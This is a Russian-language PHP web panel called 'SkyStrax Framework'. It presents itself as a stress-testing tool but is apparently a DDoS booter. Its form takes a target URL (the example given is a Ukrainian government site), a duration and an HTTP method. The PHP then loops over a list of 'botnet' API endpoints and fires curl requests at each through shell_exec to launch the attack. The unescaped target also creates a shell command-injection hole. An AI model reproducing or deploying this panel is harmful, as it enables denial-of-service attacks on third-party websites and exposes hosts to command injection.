<!doctype html><html lang="ru"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0"><title>SkyStrax Framework</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
  <link rel="stylesheet" href="styl.css"></head><body>

<header><div class="header-pattern"></div><div class="header-content">
<img src="https://f.top4top.io/p_3400tofwj2.png" alt="Image" style="width:160px;border-radius:12px;">
      <h1 class="title">SkyStrax Framework</h1><p class="subtitle">Усовершенствованный фреймворк для стресс-тестирования</p>
    </div></header>

<div class="container"><div class="main-content"><div class="panel">
        <h2 class="panel-title"><i class="fas fa-shield-alt"></i> Панель управления</h2>

<div class="stats-grid"><div class="stat-card"><div class="stat-value" id="apis-count">0</div>
<div class="stat-label">Доступные ботнеты</div></div><div class="stat-card">
<div class="stat-value" id="attacks-count">0</div><div class="stat-label">Атак запущено</div></div></div>

<form method="POST" id="attack-form"><div class="form-group"><label for="target">Целевой адрес:
<span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltip-text">введите полный URL цели включая http:// или https://</span></span></label>
<div class="input-group"><i class="fas fa-globe input-icon"></i><input type="text" name="target" id="target" class="input-with-icon" placeholder="https://ukraine.ua/" required></div></div>

<div class="form-group"><label for="time">Длительность операции (секунды):<span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltip-text">Длительность атаки в секундах</span></span></label>
<div class="input-group"><i class="fas fa-clock input-icon"></i><input type="number" name="time" id="time" class="input-with-icon" min="1" max="3600" value="60" required></div></div>

<div class="form-group"><label for="method">Метод запроса:<span class="tooltip"><i class="fas fa-info-circle"></i><span class="tooltip-text">Выберите HTTP метод</span></span></label>
<div class="input-group"><select name="method" id="method"><option value="head">HEAD - Только заголовки</option>
<option value="get">GET - Стандартный запрос</option><option value="post">POST - Отправка данных</option>
<option value="random">RANDOM - Смешанные методы</option></select></div></div>

<button type="submit" name="attack" class="btn btn-primary btn-full"><i class="fas fa-rocket btn-icon"></i> Запустить атаку</button></form>

<div id="operation-progress" style="display:none;margin-top:20px;"><div style="display:flex;justify-content:space-between;margin-bottom:5px;">
<span>Атака в процессе...</span><span id="timer">60s</span></div><div class="progress-bar">
<div class="progress-bar-fill" id="progress-fill"></div></div></div></div>

<div class="panel"><h2 class="panel-title"><i class="fas fa-terminal"></i> Лог атак</h2>
<div class="log-container" id="log-output">
<?php
$success=false;if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['attack'])){
$target=$_POST['target'];$time=$_POST['time'];$method=$_POST['method'];
if(!empty($target)&&!empty($time)&&!empty($method)){
$apis=file('api.txt',FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);
echo "<div class=\"log-entry info\">";echo "[".date('Y-m-d H:i:s')."] Инициализация атаки...\n";echo "</div>";
echo "<div class=\"log-entry info\">";echo "[".date('Y-m-d H:i:s')."] Цель: <span class=\"target-preview\">$target</span>\n";echo "</div>";
echo "<div class=\"log-entry info\">";echo "[".date('Y-m-d H:i:s')."] Длительность: $time секунд, Метод: <span class=\"method-tag $method\">$method</span>\n";echo "</div>";
$log="Запуск атаки на $target в течение $time секунд методом $method\n";$log.="Время: ".date('Y-m-d H:i:s')."\n";$log.="---\n";
foreach($apis as $api){$url="$api?target=$target&time=$time&methods=$method";$cmd="curl -s '$url' &";shell_exec($cmd);
echo "<div class=\"log-entry success\">";echo "[".date('Y-m-d H:i:s')."] API активирован: ".htmlspecialchars($api)."\n";echo "</div>";
$log.="-> $api\n";}
echo "<div class=\"log-entry success\">";echo "[".date('Y-m-d H:i:s')."] Атака успешно запущена с ".count($apis)." конечными точками\n";echo "</div>";
file_put_contents("attack_log.txt",$log."\n",FILE_APPEND);echo "<script>document.addEventListener('DOMContentLoaded',function(){showNotification('success','Атака успешно запущена!');
startProgress($time);document.getElementById('apis-count').textContent='".count($apis)."';let attackCount=parseInt(localStorage.getItem('attackCount')||'0');
attackCount++;localStorage.setItem('attackCount',attackCount);document.getElementById('attacks-count').textContent=attackCount;});</script>";
$success=true;}else{echo "<div class=\"log-entry error\">";echo "[".date('Y-m-d H:i:s')."] Ошибка: Атака не удалась. Заполните все обязательные поля.\n";echo "</div>";
echo "<script>document.addEventListener('DOMContentLoaded',function(){showNotification('error','Атака не удалась. Заполните все поля.');});</script>";}}
if(!$success&&file_exists("attack_log.txt")){$logs=file("attack_log.txt",FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);$logs=array_slice($logs,-20);
foreach($logs as $line){if(strpos($line,'->')===0){echo "<div class=\"log-entry info\">";}else if(strpos($line,'Launching')===0){
echo "<div class=\"log-entry success\">";}else{echo "<div class=\"log-entry\">";}echo htmlspecialchars($line)."\n";echo "</div>";}}?>
</div></div></div>

<div class="status-bar"><div class="status-item"><i class="fas fa-lock"></i> Безопасное соединение</div>
<div class="status-item"><i class="fas fa-user-shield"></i> Только для авторизованных</div>
<div class="status-item"><i class="fas fa-calendar-alt"></i> <span id="current-date"></span></div></div></div>

<footer class="footer"><svg class="official-seal" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="256" cy="256" r="240" fill="none" stroke="#1a3c6e" stroke-width="2"/><circle cx="256" cy="256" r="210" fill="none" stroke="#1a3c6e" stroke-width="1"/>
<path d="M256 46V466M46 256H466M151 151L361 361M151 361L361 151" stroke="#1a3c6e" stroke-width="1"/>
<circle cx="256" cy="256" r="100" fill="none" stroke="#1a3c6e" stroke-width="3"/><path d="M256 156V356M156 256H356" stroke="#1a3c6e" stroke-width="3"/></svg>
<p><strong>SkyStrax Framework</strong></p><p class="timestamp" id="footer-timestamp">Системное время: <span id="current-time"></span></p>
<p>© 2025 Kirov Elite Group <br>dnt sell this open source script JB! #AntiMargaStore</p></footer>

<div id="notification" class="notification"><i class="notification-icon"></i><div class="notification-content">
<div class="notification-message"></div></div></div><script src="sc.js"></script></body></html>
